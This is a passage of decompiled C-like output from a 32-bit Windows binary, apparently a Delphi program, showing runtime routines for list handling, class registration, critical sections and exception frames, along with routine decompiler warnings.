        sub_418B90(*(_DWORD **)(a1 + 4), v6);
      --v6;
    }
    while ( v6 != -1 );
  }
  v8 = (*(int (**)(void))(**(_DWORD **)(a1 + 8) + 20))();
  v9 = v8 - 1;
  if ( v8 - 1 >= 0 )
  {
    do
    {
      v10 = (const void *)(*(int (**)(void))(**(_DWORD **)(a1 + 8) + 24))();
      LOBYTE(v8) = sub_41835C(v10, a2);
      if ( (_BYTE)v8 )
        LOBYTE(v8) = (*(int (**)(void))(**(_DWORD **)(a1 + 8) + 72))();
      --v9;
    }
    while ( v9 != -1 );
  }
  return v8;
}

//----- (00418420) --------------------------------------------------------
_DWORD *__usercall sub_418420@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // edi
  _DWORD *v4; // esi
  char v6; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v6);
  v2 = a2;
  v3 = a1;
  sub_403504(a1, 0);
  v3[1] = sub_403504(off_417624, 1);
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(v3 + 2));
  v4 = sub_418240(dword_4181DC, 1, (int)off_4176E0);
  sub_418B44((_DWORD *)v3[1], (int)v4);
  *((_BYTE *)v4 + 16) = 1;
  if ( v2 )
    sub_4038BC(v3);
  return v3;
}
// 41842A: variable 'v6' is possibly undefined
// 41842F: variable 'a2' is possibly undefined
// 417624: using guessed type int (*off_417624[4])();
// 4176E0: using guessed type int (*off_4176E0[3])();
// 4181DC: using guessed type int dword_4181DC[3];

//----- (00418494) --------------------------------------------------------
_DWORD *__usercall sub_418494@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int v6; // eax
  int v7; // ebp
  int v8; // edi
  _DWORD *v9; // eax
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v2 + 2));
  v6 = v5[1];
  if ( *(_DWORD *)(v6 + 8) - 1 >= 0 )
  {
    v7 = *(_DWORD *)(v6 + 8);
    v8 = 0;
    do
    {
      v9 = (_DWORD *)sub_418C80(v5[1], v8);
      sub_403534(v9);
      ++v8;
      --v7;
    }
    while ( v7 );
  }
  sub_403534((_DWORD *)v5[1]);
  result = sub_403524(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 41849D: variable 'v3' is possibly undefined

//----- (004184F0) --------------------------------------------------------
int __usercall sub_4184F0@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // edi
  int v4; // eax
  int v5; // ebx
  int v6; // esi
  int v7; // eax

  v3 = 0;
  v4 = *(_DWORD *)(a1 + 4);
  if ( *(_DWORD *)(v4 + 8) - 1 >= 0 )
  {
    v5 = *(_DWORD *)(v4 + 8);
    v6 = 0;
    do
    {
      v7 = sub_418C80(*(_DWORD *)(a1 + 4), v6);
      if ( *(_BYTE *)(v7 + 16) )
        v3 = sub_4182FC(v7, a2);
      if ( v3 )
        break;
      ++v6;
      --v5;
    }
    while ( v5 );
  }
  return v3;
}

//----- (00418534) --------------------------------------------------------
void __usercall sub_418534(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00418540) --------------------------------------------------------
void __usercall sub_418540(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (0041854C) --------------------------------------------------------
char __usercall sub_41854C@<al>(int a1@<eax>, void *a2@<edx>)
{
  int v4; // eax
  int v5; // ebx
  int v6; // eax

  v4 = *(_DWORD *)(a1 + 4);
  v5 = *(_DWORD *)(v4 + 8) - 1;
  if ( v5 >= 0 )
  {
    do
    {
      v6 = sub_418C80(*(_DWORD *)(a1 + 4), v5);
      LOBYTE(v4) = sub_41837C(v6, a2);
      --v5;
    }
    while ( v5 != -1 );
  }
  return v4;
}

//----- (0041857C) --------------------------------------------------------
int __usercall sub_41857C@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int v4; // ebx
  int v5; // esi
  int v6; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v9; // [esp-8h] [ebp-1Ch]
  int *v10; // [esp-4h] [ebp-18h]
  int v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v12 = a2;
  v11 = 0;
  sub_418534(dword_42CBCC);
  v10 = &savedregs;
  v9 = &loc_4185F3;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v3 = *(_DWORD *)(a1 + 4);
  if ( *(_DWORD *)(v3 + 8) - 1 < 0 )
  {
LABEL_6:
    __writefsdword(0, (unsigned int)ExceptionList);
    v10 = (int *)&loc_4185FA;
    sub_418540(dword_42CBCC);
  }
  else
  {
    v4 = *(_DWORD *)(v3 + 8);
    v5 = 0;
    while ( 1 )
    {
      v6 = sub_418C80(*(_DWORD *)(a1 + 4), v5);
      v11 = sub_4182FC(v6, v12);
      if ( v11 )
        break;
      ++v5;
      if ( !--v4 )
        goto LABEL_6;
    }
    sub_403D78((unsigned int)ExceptionList, (int)v9, (int)v10);
  }
  return v11;
}
// 42CBCC: using guessed type int dword_42CBCC;

//----- (00418604) --------------------------------------------------------
int __usercall sub_418604@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(a1 - 56);
  if ( result )
    return *(_DWORD *)(result + 2);
  return result;
}

//----- (00418610) --------------------------------------------------------
_DWORD *__usercall sub_418610@<eax>(int a1@<eax>)
{
  int v1; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v4; // [esp-8h] [ebp-18h]
  int *v5; // [esp-4h] [ebp-14h]
  void *v6; // [esp+0h] [ebp-10h]
  char *v7; // [esp+4h] [ebp-Ch] BYREF
  int v8; // [esp+8h] [ebp-8h] BYREF
  char v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v7 = 0;
  v5 = &savedregs;
  v4 = &loc_418670;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v8 = a1;
  v9 = 11;
  sub_4063D4(off_42BA30[0], &v7);
  v1 = sub_4095A4((int)dword_4173F8, 1, (int)v7, 0, (int)&v8);
  sub_403CCC(v1, (int)ExceptionList, (int)v4, (int)v5, (int)v6);
  __writefsdword(0, (unsigned int)v4);
  v6 = &loc_418677;
  return sub_40426C(&v7);
}
// 4173F8: using guessed type int dword_4173F8[4];
// 42BA30: using guessed type int **off_42BA30[3];

//----- (0041867C) --------------------------------------------------------
int __usercall sub_41867C@<eax>(int a1@<eax>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  sub_418534(dword_42CBCC);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_4186C2;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  v5 = sub_4184F0(dword_42CBCC, a1);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_4186C9;
  sub_418540(dword_42CBCC);
  return v5;
}
// 42CBCC: using guessed type int dword_42CBCC;

//----- (004186D0) --------------------------------------------------------
void __usercall sub_4186D0(void *a1@<eax>)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  sub_418534(dword_42CBCC);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_418712;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_41854C(dword_42CBCC, a1);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_418719;
  sub_418540(dword_42CBCC);
}
// 42CBCC: using guessed type int dword_42CBCC;

//----- (00418774) --------------------------------------------------------
_DWORD *__userpurge sub_418774@<eax>(_DWORD *result@<eax>, char a2@<dl>, int a3@<ecx>, int a4, int a5)
{
  char v5; // [esp-10h] [ebp-10h]

  if ( a2 )
    result = (_DWORD *)sub_403864((int)result, a2, v5);
  result[1] = a3;
  result[2] = a5;
  result[3] = a4;
  if ( a2 )
    return sub_4038BC(result);
  return result;
}
// 41877E: variable 'v5' is possibly undefined
// 418783: variable 'a3' is possibly undefined
// 418794: variable 'a2' is possibly undefined

//----- (004187AC) --------------------------------------------------------
void __usercall sub_4187AC(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  _DWORD *v3; // eax

  v3 = sub_418774(dword_418768, 1, a1, a3, a2);
  sub_418EFC(dword_42CBC8, (int)v3);
}
// 418768: using guessed type int dword_418768[3];
// 42CBC8: using guessed type int dword_42CBC8;

//----- (004187D8) --------------------------------------------------------
int __usercall sub_4187D8@<eax>(int a1@<eax>)
{
  int v2; // esi
  int v3; // ebx
  int v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v7; // [esp-8h] [ebp-18h]
  int *v8; // [esp-4h] [ebp-14h]
  int v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = 0;
  v2 = sub_418F84(dword_42CBC8);
  v8 = &savedregs;
  v7 = &loc_418842;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v3 = *(_DWORD *)(v2 + 8) - 1;
  if ( v3 < 0 )
  {
LABEL_5:
    __writefsdword(0, (unsigned int)ExceptionList);
    v8 = (int *)&loc_418849;
    sub_418FE8(dword_42CBC8);
  }
  else
  {
    while ( 1 )
    {
      v4 = sub_418C80(v2, v3);
      if ( a1 == *(_DWORD *)(v4 + 4) )
        break;
      if ( --v3 == -1 )
        goto LABEL_5;
    }
    v9 = *(_DWORD *)(v4 + 12);
    sub_403D78((unsigned int)ExceptionList, (int)v7, (int)v8);
  }
  return v9;
}
// 42CBC8: using guessed type int dword_42CBC8;

//----- (00418854) --------------------------------------------------------
int __usercall sub_418854@<eax>(int a1@<eax>)
{
  int v2; // esi
  int v3; // ebx
  int v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v7; // [esp-8h] [ebp-18h]
  int *v8; // [esp-4h] [ebp-14h]
  int v9; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v9 = 0;
  v2 = sub_418F84(dword_42CBC8);
  v8 = &savedregs;
  v7 = &loc_4188BE;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v3 = *(_DWORD *)(v2 + 8) - 1;
  if ( v3 < 0 )
  {
LABEL_5:
    __writefsdword(0, (unsigned int)ExceptionList);
    v8 = (int *)&loc_4188C5;
    sub_418FE8(dword_42CBC8);
  }
  else
  {
    while ( 1 )
    {
      v4 = sub_418C80(v2, v3);
      if ( a1 == *(_DWORD *)(v4 + 4) )
        break;
      if ( --v3 == -1 )
        goto LABEL_5;
    }
    v9 = *(_DWORD *)(v4 + 8);
    sub_403D78((unsigned int)ExceptionList, (int)v7, (int)v8);
  }
  return v9;
}
// 42CBC8: using guessed type int dword_42CBC8;

//----- (004188D0) --------------------------------------------------------
char __userpurge sub_4188D0@<al>(_BYTE *a1@<eax>, _DWORD *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // esi
  _BYTE **i; // ebx
  char result; // al

  if ( a4 < 0 )
    return 0;
  v5 = a4 + 1;
  for ( i = (_BYTE **)(a3 + 4); !sub_407ACC(*i, a1); i += 2 )
  {
    if ( !--v5 )
      return 0;
  }
  result = 1;
  *a2 = *(i - 1);
  return result;
}

//----- (00418910) --------------------------------------------------------
char __userpurge sub_418910@<al>(int a1@<eax>, volatile __int32 *a2@<edx>, _DWORD *a3@<ecx>, int a4)
{
  int v4; // esi
  char v7; // [esp+Fh] [ebp-5h]

  if ( a4 < 0 )
    return 0;
  v4 = a4 + 1;
  while ( a1 != *a3 )
  {
    a3 += 2;
    if ( !--v4 )
      return 0;
  }
  v7 = 1;
  sub_4042C0(a2, a3[1]);
  return v7;
}

//----- (00418954) --------------------------------------------------------
int sub_418954()
{
  int result; // eax
  int v1; // ebx
  int (*v2)(void); // eax

  result = 0;
  if ( dword_42CBD0 )
  {
    v1 = *(_DWORD *)(dword_42CBD0 + 8) - 1;
    if ( v1 >= 0 )
    {
      do
      {
        v2 = (int (*)(void))sub_418C80(dword_42CBD0, v1);
        result = v2();
        if ( result )
          break;
        --v1;
      }
      while ( v1 != -1 );
    }
  }
  return result;
}
// 42CBD0: using guessed type int dword_42CBD0;

//----- (00418994) --------------------------------------------------------
_DWORD *__usercall sub_418994@<eax>(int a1@<eax>, int a2@<edx>, void (__stdcall **a3)(int *)@<ecx>)
{
  int v5; // ecx
  unsigned int v7[2]; // [esp-8h] [ebp-14h] BYREF
  int *v8; // [esp+0h] [ebp-Ch]
  void (__stdcall ***v9)(int *); // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = (void (__stdcall ***)(int *))sub_41B2D8((int)&off_417F20, 1, a1, 1024);
  (**v9)(v8);
  v9[7] = a3;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4189F1;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_41DC38(v9, a2, v5);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4189F8;
  return sub_403534(v9);
}
// 4189D6: variable 'v5' is possibly undefined
// 417F20: using guessed type int (*off_417F20)();

//----- (00418A00) --------------------------------------------------------
char __userpurge sub_418A00@<al>(
        int a1@<eax>,
        int a2@<edx>,
        void (__stdcall **a3)(int *)@<ecx>,
        void (__stdcall **a4)(int *))
{
  unsigned int v7; // eax
  bool v8; // al
  __int64 v10; // [esp+0h] [ebp-38h]
  unsigned int v11[2]; // [esp+8h] [ebp-30h] BYREF
  void **v12; // [esp+10h] [ebp-28h]
  _DWORD v13[2]; // [esp+14h] [ebp-24h] BYREF
  void **v14; // [esp+1Ch] [ebp-1Ch]
  _DWORD *v15; // [esp+2Ch] [ebp-Ch]
  _DWORD *v16; // [esp+30h] [ebp-8h]
  bool v17; // [esp+37h] [ebp-1h]
  void *savedregs; // [esp+38h] [ebp+0h] BYREF

  v17 = 0;
  v14 = (void **)sub_40347C(a1);
  if ( v14 == (void **)sub_40347C(a2) )
  {
    v14 = (void **)sub_419520(a1);
    if ( v14 == (void **)sub_419520(a2) )
    {
      v16 = sub_403504(&off_417DB0, 1);
      v14 = &savedregs;
      v13[1] = &loc_418B10;
      v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v13);
      sub_418994((int)v16, a1, a3);
      v15 = sub_403504(&off_417DB0, 1);
      v12 = &savedregs;
      v11[1] = (unsigned int)&loc_418AF3;
      v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v11);
      sub_418994((int)v15, a2, a4);
      v10 = sub_41AAD4((int)v16);
      v8 = 0;
      if ( sub_41AAD4((int)v15) == v10 )
      {
        v7 = sub_41AAD4((int)v16);
        if ( (unsigned __int8)sub_407A58((_DWORD *)v16[1], (_DWORD *)v15[1], v7) )
          v8 = 1;
      }
      v17 = v8;
      __writefsdword(0, v11[0]);
      v12 = (void **)&loc_418AFA;
      sub_403534(v15);
      __writefsdword(0, (unsigned int)v16);
      savedregs = &loc_418B17;
      sub_403534(v16);
    }
  }
  return v17;
}
// 417DB0: using guessed type int (*off_417DB0)();

//----- (00418B24) --------------------------------------------------------
int __usercall sub_418B24@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  int result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  result = (*(int (**)(void))(*v2 + 8))();
  if ( v4 > 0 )
    return sub_4038B4(v5);
  return result;
}
// 418B2B: variable 'v3' is possibly undefined

//----- (00418B44) --------------------------------------------------------
int __usercall sub_418B44@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // esi

  v4 = a1[2];
  if ( v4 == a1[3] )
    (*(void (**)(void))*a1)();
  *(_DWORD *)(a1[1] + 4 * v4) = a2;
  ++a1[2];
  if ( a2 )
    (*(void (__fastcall **)(_DWORD, int))(*a1 + 4))(0, a2);
  return v4;
}

//----- (00418B78) --------------------------------------------------------
_DWORD *__usercall sub_418B78@<eax>(_DWORD *a1@<eax>)
{
  sub_418DB8(a1, 0);
  return sub_418D7C(a1, 0);
}

//----- (00418B90) --------------------------------------------------------
int __usercall sub_418B90@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // ecx
  int v5; // edi
  int result; // eax

  if ( a2 < 0 || a2 >= a1[2] )
    sub_418C2C(a2, off_42B9FC[0]);
  v5 = sub_418C80((int)a1, a2);
  result = --a1[2];
  if ( a2 < result )
    result = sub_402844((char *)(a1[1] + 4 * a2 + 4), (char *)(a1[1] + 4 * a2), 4 * (result - a2));
  if ( v5 )
  {
    LOBYTE(v4) = 2;
    return (*(int (__fastcall **)(int, int))(*a1 + 4))(v4, v5);
  }
  return result;
}
// 418BE9: variable 'v4' is possibly undefined
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (00418BF0) --------------------------------------------------------
int __usercall sub_418BF0@<eax>(int a1@<ebp>)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (00418BF4) --------------------------------------------------------
int __usercall sub_418BF4@<eax>(
        int a1@<edx>,
        int a2@<ecx>,
        int a3@<ebx>,
        int a4@<ebp>,
        int a5@<esi>,
        int a6,
        int a7,
        int a8,
        int a9)
{
  int v11; // eax
  int v13; // [esp+0h] [ebp-10h] BYREF
  char v14; // [esp+4h] [ebp-Ch]
  int v15; // [esp+8h] [ebp-8h]
  int v16; // [esp+Ch] [ebp-4h]

  v16 = a3;
  v15 = a5;
  sub_418BF0(a4);
  v13 = a2;
  v14 = 0;
  v11 = sub_4095A4((int)dword_417454, 1, a1, 0, (int)&v13);
  return sub_403CCC(v11, a6, a7, a8, a9);
}
// 417454: using guessed type int dword_417454[3];

//----- (00418C2C) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *__fastcall sub_418C2C(int a1, int **a2)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-14h] [ebp-18h] BYREF
  void *v6; // [esp-10h] [ebp-14h]
  void **v7; // [esp-Ch] [ebp-10h]
  int v8; // [esp-8h] [ebp-Ch]
  unsigned int v9; // [esp-4h] [ebp-8h]
  char *v10; // [esp+0h] [ebp-4h] BYREF
  void *savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v7 = &savedregs;
  v6 = &loc_418C74;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4063D4(a2, &v10);
  sub_418BF4((int)v10, a1, (int)a2, (int)&savedregs, a1, (int)ExceptionList, (int)v6, (int)v7, v8);
  __writefsdword(0, v9);
  savedregs = &loc_418C7B;
  return sub_40426C(&v10);
}
// 418C6E: bad sp value at call

//----- (00418C80) --------------------------------------------------------
int __usercall sub_418C80@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 8) )
    sub_418C2C(a2, off_42B9FC[0]);
  return *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * a2);
}
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (00418CA8) --------------------------------------------------------
_DWORD *__usercall sub_418CA8@<eax>(_DWORD *a1@<eax>)
{
  int v1; // edx
  int v2; // ecx

  v1 = a1[3];
  if ( v1 <= 64 )
  {
    if ( v1 <= 8 )
      v2 = 4;
    else
      v2 = 16;
  }
  else
  {
    v2 = (int)a1[3] >> 2;
  }
  return sub_418D7C(a1, v1 + v2);
}
// 418CB4: conditional instruction was optimized away because edx.4>=41

//----- (00418CDC) --------------------------------------------------------
int __usercall sub_418CDC@<eax>(int a1@<eax>, int a2@<edx>)
{
  int i; // ecx

  for ( i = 0; i < *(_DWORD *)(a1 + 8) && a2 != *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * i); ++i )
    ;
  if ( i == *(_DWORD *)(a1 + 8) )
    return -1;
  return i;
}

//----- (00418CFC) --------------------------------------------------------
int __usercall sub_418CFC@<eax>(int a1@<eax>)
{
  return sub_418C80(a1, *(_DWORD *)(a1 + 8) - 1);
}

//----- (00418D08) --------------------------------------------------------
int __usercall sub_418D08@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v6; // edx
  int result; // eax
  int v8; // ecx

  if ( a2 < 0 || a2 >= a1[2] )
    sub_418C2C(a2, off_42B9FC[0]);
  v6 = a1[1];
  result = *(_DWORD *)(v6 + 4 * a2);
  if ( a3 != result )
  {
    v8 = a1[1];
    *(_DWORD *)(v6 + 4 * a2) = a3;
    if ( result )
    {
      LOBYTE(v8) = 2;
      result = (*(int (__fastcall **)(int, int))(*a1 + 4))(v8, result);
    }
    if ( a3 )
      return (*(int (__fastcall **)(_DWORD, int))(*a1 + 4))(0, a3);
  }
  return result;
}
// 42B9FC: using guessed type int **off_42B9FC[3];

//----- (00418D5C) --------------------------------------------------------
int __usercall sub_418D5C@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v3; // eax
  int v4; // esi

  v3 = sub_418CDC((int)a1, a2);
  v4 = v3;
  if ( v3 >= 0 )
    sub_418B90(a1, v3);
  return v4;
}

//----- (00418D7C) --------------------------------------------------------
_DWORD *__usercall sub_418D7C@<eax>(_DWORD *result@<eax>, int a2@<edx>)
{
  _DWORD *v3; // ebx

  v3 = result;
  if ( a2 < result[2] || a2 > 0x7FFFFFF )
    result = sub_418C2C(a2, off_42B97C[0]);
  if ( a2 != v3[3] )
  {
    result = sub_402720(v3 + 1, 4 * a2);
    v3[3] = a2;
  }
  return result;
}
// 42B97C: using guessed type int **off_42B97C[2];

//----- (00418DB8) --------------------------------------------------------
__int16 __usercall sub_418DB8@<ax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v4; // eax
  int v5; // ebp
  int v6; // edi

  if ( (unsigned int)a2 >= 0x8000000 )
    sub_418C2C(a2, off_42B934[0]);
  if ( a2 > a1[3] )
    sub_418D7C(a1, a2);
  v4 = a1[2];
  if ( a2 <= v4 )
  {
    v5 = v4 - 1;
    if ( a2 <= v4 - 1 )
    {
      v6 = a2 - v4;
      do
      {
        LOWORD(v4) = sub_418B90(a1, v5--);
        ++v6;
      }
      while ( v6 );
    }
  }
  else
  {
    LOWORD(v4) = sub_402E48((char *)(a1[1] + 4 * v4), 4 * (a2 - v4), 0);
  }
  a1[2] = a2;
  return v4;
}
// 42B934: using guessed type int **off_42B934[2];

//----- (00418E2C) --------------------------------------------------------
_DWORD *__usercall sub_418E2C@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  char v5; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v5);
  v2 = a2;
  v3 = a1;
  sub_403504(a1, 0);
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(v3 + 2));
  v3[1] = sub_403504(off_417624, 1);
  *((_BYTE *)v3 + 32) = 0;
  if ( v2 )
    sub_4038BC(v3);
  return v3;
}
// 418E35: variable 'v5' is possibly undefined
// 418E3A: variable 'a2' is possibly undefined
// 417624: using guessed type int (*off_417624[4])();

//----- (00418E80) --------------------------------------------------------
void __usercall sub_418E80(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  char v6; // [esp+3h] [ebp-5h]
  _DWORD *v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v2 = sub_4038CC(a1, a2);
  v6 = v3;
  v7 = v2;
  sub_418F84((int)v2);
  v5 = &savedregs;
  v4[1] = (unsigned int)sub_418EE2;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_403534((_DWORD *)v7[1]);
  sub_403524(v7, v6 & 0xFC);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_418EE9;
  sub_418FE8((int)v7);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v7 + 2));
  if ( v6 > 0 )
    sub_4038B4(v7);
}
// 418E8B: variable 'v3' is possibly undefined

//----- (00418EFC) --------------------------------------------------------
void __usercall sub_418EFC(int a1@<eax>, int a2@<edx>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  sub_418F84(a1);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_418F78;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( *(_BYTE *)(v5 + 32) == 1 || sub_418CDC(*(_DWORD *)(v5 + 4), a2) == -1 )
  {
    sub_418B44(*(_DWORD **)(v5 + 4), a2);
  }
  else if ( *(_BYTE *)(v5 + 32) == 2 )
  {
    sub_418C2C(a2, off_42B91C[0]);
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_418F7F;
  sub_418FE8(v5);
}
// 42B91C: using guessed type int **off_42B91C[2];

//----- (00418F84) --------------------------------------------------------
int __usercall sub_418F84@<eax>(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  return *(_DWORD *)(a1 + 4);
}

//----- (00418F98) --------------------------------------------------------
void __usercall sub_418F98(int a1@<eax>, int a2@<edx>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  sub_418F84(a1);
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_418FDB;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_418D5C(*(_DWORD **)(v5 + 4), a2);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_418FE2;
  sub_418FE8(v5);
}

//----- (00418FE8) --------------------------------------------------------
void __usercall sub_418FE8(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00418FF4) --------------------------------------------------------
_DWORD *__usercall sub_418FF4@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_41B6CC((int)v2);
  result = sub_403524(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 418FFB: variable 'v3' is possibly undefined

//----- (00419020) --------------------------------------------------------
_DWORD *__usercall sub_419020@<eax>(int *a1@<eax>, int (***a2)(void)@<edx>)
{
  if ( a2 )
    return (_DWORD *)(**a2)();
  else
    return sub_419034(a1, 0);
}

//----- (00419034) --------------------------------------------------------
_DWORD *__usercall sub_419034@<eax>(int *a1@<eax>, int *a2@<edx>)
{
  int v3; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-128h] BYREF
  void *v6; // [esp-8h] [ebp-124h]
  int *v7; // [esp-4h] [ebp-120h]
  void *v8; // [esp+0h] [ebp-11Ch]
  char *v9; // [esp+8h] [ebp-114h] BYREF
  char v10; // [esp+Ch] [ebp-110h]
  char *v11; // [esp+10h] [ebp-10Ch]
  char v12; // [esp+14h] [ebp-108h]
  char v13[256]; // [esp+18h] [ebp-104h] BYREF
  char *v14; // [esp+118h] [ebp-4h] BYREF
  int savedregs; // [esp+11Ch] [ebp+0h] BYREF

  v14 = 0;
  v7 = &savedregs;
  v6 = &loc_4190EA;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a2 )
  {
    sub_403484(*a2, v13);
    sub_4044C8(&v14, v13);
  }
  else
  {
    sub_404304((volatile __int32 *)&v14, (__int32)&dword_419100);
  }
  v9 = v14;
  v10 = 11;
  sub_403484(*a1, v13);
  v11 = v13;
  v12 = 4;
  v3 = sub_409660((int)dword_40748C, 1, off_42B940[0], 1, (int)&v9);
  sub_403CCC(v3, (int)ExceptionList, (int)v6, (int)v7, (int)v8);
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_4190F1;
  return sub_40426C(&v14);
}
// 40748C: using guessed type int dword_40748C[4];
// 419100: using guessed type int dword_419100;
